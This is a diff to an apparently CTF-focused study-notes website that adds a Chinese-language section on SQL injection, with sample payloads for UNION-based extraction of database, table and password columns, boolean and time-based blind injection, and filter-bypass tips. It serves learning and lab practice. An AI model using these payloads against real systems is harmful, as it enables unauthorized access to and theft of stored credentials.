@@ -430,6 +430,8 @@
       
         
       
+        
+      
     
     
       
@@ -620,6 +622,48 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      Sql注入
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Sql注入">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      基础注入
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      特殊注入
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      注入绕过
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -683,6 +727,27 @@
   
   <span class="md-ellipsis">
     Pwn
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Crypto/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Crypto
   </span>
   
 
@@ -1004,6 +1069,81 @@
 <a id="__codelineno-2-24" name="__codelineno-2-24"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></div></td></tr></table></div>
 <p>详细的教程还请查看：<a href="https://www.runoob.com/html/html-tutorial.html">HTML|菜鸟教程</a></p>
+<h2 id="sql">Sql注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h2>
+<h3 id="_2">基础注入<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p>根据网站功能猜测 Sql语句：</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">column1</span><span class="p">,</span><span class="w"> </span><span class="n">column2</span><span class="p">,</span><span class="w"> </span><span class="p">...</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">condition</span><span class="p">;</span><span class="cm">/* id = num or id = &#39;num&#39; 数字型和字符型 */</span>
+</code></pre></div></td></tr></table></div>
+<p>构造<strong>运算式</strong>来判断是数字型还是字符型，如 1 和 2 - 1；或分别输入奇数个和偶数个<strong>引号</strong>看是否报错。</p>
+<p>联合查询：<code>UNION SELECT （） FROM table_name</code>前后列数必须一致：</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="n">id</span><span class="o">=</span><span class="mi">3</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="w"> </span><span class="cm">/* 刚好两列时才能够正常输出 */</span>
+</code></pre></div></td></tr></table></div>
+<p>使用UNION获取更多数据：</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-5-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-5-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-5-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-5-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-5-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-5-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-5-10">10</a></span>
+<span class="normal"><a href="#__codelineno-5-11">11</a></span>
+<span class="normal"><a href="#__codelineno-5-12">12</a></span>
+<span class="normal"><a href="#__codelineno-5-13">13</a></span>
+<span class="normal"><a href="#__codelineno-5-14">14</a></span>
+<span class="normal"><a href="#__codelineno-5-15">15</a></span>
+<span class="normal"><a href="#__codelineno-5-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="err">在</span><span class="n">MySQL中</span><span class="err">，所有的数据库名存放在</span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata的schema_name字段下</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">schema_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">;</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="err">所有的表名存放在</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables的table_name字段下</span><span class="err">，可以以</span><span class="n">table_schema为条件筛选</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;db_name&#39;</span><span class="p">;</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5"></a><span class="err">所有的列名存放在</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns的column_name字段下</span><span class="err">，可以以</span><span class="n">table_schema和table_name为条件筛选</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;table_name&#39;</span><span class="w"> </span>
+<a id="__codelineno-5-7" name="__codelineno-5-7"></a><span class="k">AND</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;db_name&#39;</span><span class="p">;</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">col_name1</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="p">,</span><span class="w"> </span><span class="n">col_nameN</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span>
+<a id="__codelineno-5-9" name="__codelineno-5-9"></a><span class="n">group_concat</span><span class="p">(</span><span class="k">schema_name</span><span class="p">),</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">;</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10"></a><span class="err">获取所有数据库信息，以此类推</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11"></a><span class="err">获取到表、列名后，可以获取其他数据。这里以</span><span class="n">users表中的passwd字段为例</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">col_name1</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="p">,</span><span class="w"> </span><span class="n">col_nameN</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span>
+<a id="__codelineno-5-13" name="__codelineno-5-13"></a><span class="n">group_concat</span><span class="p">(</span><span class="n">passwd</span><span class="p">),</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">;</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14"></a><span class="err">如果想要分行获取，也可以借助</span><span class="k">LIMIT</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">col_name1</span><span class="p">,</span><span class="w"> </span><span class="err">…</span><span class="p">,</span><span class="w"> </span><span class="n">col_nameN</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">passwd</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span>
+<a id="__codelineno-5-16" name="__codelineno-5-16"></a><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</code></pre></div></td></tr></table></div>
+<p><code>SELECT * FROM</code>'users' <code>WHERE username = 'ro' 'ot'</code>也能输出user found：语法会自动拼接字符串，中间要隔一个空格。</p>
+<p>user.php?uname=NotaUser' or '1' = '1:可以拼接成完整的bool语句。</p>
+<p><img alt="1720509421214" src="../image/Web/1720509421214.png" /></p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span>
+<span class="normal"><a href="#__codelineno-6-4">4</a></span>
+<span class="normal"><a href="#__codelineno-6-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a>uname=a&#39; or ASCII(SUBSTR(DATABASE(), 1, 1))&gt;0#
+<a id="__codelineno-6-2" name="__codelineno-6-2"></a>SELECT col_name(…) FROM table_name WHERE username = &#39;a&#39; or ASCII(SUBSTR(DATABASE(), 1, 1))&gt;0#&#39;
+<a id="__codelineno-6-3" name="__codelineno-6-3"></a>返回User Found，说明DATABASE()的第一位的ASCII码&gt;0
+<a id="__codelineno-6-4" name="__codelineno-6-4"></a>
+<a id="__codelineno-6-5" name="__codelineno-6-5"></a>SELECT col_name(…) FROM table_name WHERE username = &#39;a&#39; or ASCII(SUBSTR((SELECT GROUP_CONCAT(passwd) FROM users), 1, 1))&gt;0#&#39;
+</code></pre></div></td></tr></table></div>
+<p>利用响应时间获得数据：IF(condition, expr1, expr2)
+如果condition为真就执行expr1，反之执行expr2，在expr里使用不同的延时sleep(time)就能获得结果，为了保证能够运行，中间的连接使用AND，因为sql也会截短运行，在保证前面是正确的情况下，后面的语句一定会执行。</p>
+<h3 id="_3">特殊注入<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>INSERT, UPDATE, DELETE语句的注入：</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a>uname=&#39;=&#39;&#39; AND IF({condition}, SLEEP(0), SLEEP(5)) AND &#39;&#39;=&#39;&amp;email=a&amp;passwd=b
+<a id="__codelineno-7-2" name="__codelineno-7-2"></a>uname=&#39;, DATABASE(), &#39;&#39;)#&amp;email=a&amp;passwd=b /* #号是注释 */
+</code></pre></div></td></tr></table></div>
+<p>报错注入：构造错误路径，让报错输出错误的路径，不能有语法错误，否则语法错误会掩盖路径错误。</p>
+<p>堆叠注入：一行语句内有多条指令，即多个分号分隔的指令。</p>
+<p>二次注入：第一次注入的时候恶意指令被转义，但存入数据库的指令没有转义，于是第二次注入时只需调出存入数据库的指令，就能实现拼接指令（需要在第二次注入的时候没有转义的判断）。</p>
+<h3 id="_4">注入绕过<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>关键字/正则：大小写，等价命令，重复输入</p>
+<p>语义匹配：嵌套注释</p>
+<p>其他：</p>
+<p><img alt="1720512454746" src="../image/Web/1720512454746.png" /></p>
 
 
 
